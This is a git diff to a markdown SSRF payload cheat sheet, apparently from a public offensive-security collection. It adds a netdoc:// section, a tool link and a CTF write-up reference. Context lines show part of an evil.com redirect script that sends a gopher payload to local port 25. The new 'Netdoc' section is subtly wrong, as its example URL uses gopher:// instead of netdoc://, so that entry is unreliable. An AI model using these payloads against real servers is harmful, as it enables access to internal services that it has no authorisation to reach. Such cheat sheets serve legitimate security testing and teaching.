@@ -28,6 +28,7 @@
   * [tftp://](#tftp)
   * [ldap://](#ldap)
   * [gopher://](#gopher)
+  * [netdoc://](#netdoc)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -51,6 +52,7 @@
 - [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
 - [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
+- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
 
 ## Payloads with localhost
 
@@ -343,6 +345,14 @@ Content of evil.com/redirect.php:
 
         header('Location: gopher://0:25/_'.$payload);
 ?>
+```
+
+### Netdoc
+
+Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
+
+```powershell
+ssrf.php?url=gopher://127.0.0.1:4242/DATA
 ```
 
 ## SSRF to XSS 
@@ -658,3 +668,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
 - [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
+- [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
